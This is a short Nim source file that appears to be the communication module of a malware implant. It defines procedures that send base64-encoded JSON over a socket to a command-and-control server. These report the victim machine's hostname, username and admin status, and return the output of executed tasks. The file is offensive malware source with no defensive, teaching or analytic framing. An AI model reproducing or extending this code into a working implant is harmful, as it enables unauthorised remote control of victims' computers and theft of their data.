import net, base64, json

proc sendData(client: Socket, data: string) =
    client.send(encode(data) & "\r\n")

proc sendOutput*(client: Socket, category: string, output: string) =
    var j = %*
        {
            "task": "output",
            "category": category,
            "output": encode(output)
        }
    client.sendData($j)

proc identify*(client: Socket, hostname: string, isAdmin: bool, username: string) =
    var j = %*
        {
            "task": "identify",
            "hostname": hostname,
            "isAdmin": isAdmin,
            "username": username
        }
    client.sendData($j)

proc connectToC2*(client: Socket) =
    var j = %*
        {
            "task": "connect"
        }
    client.sendData($j)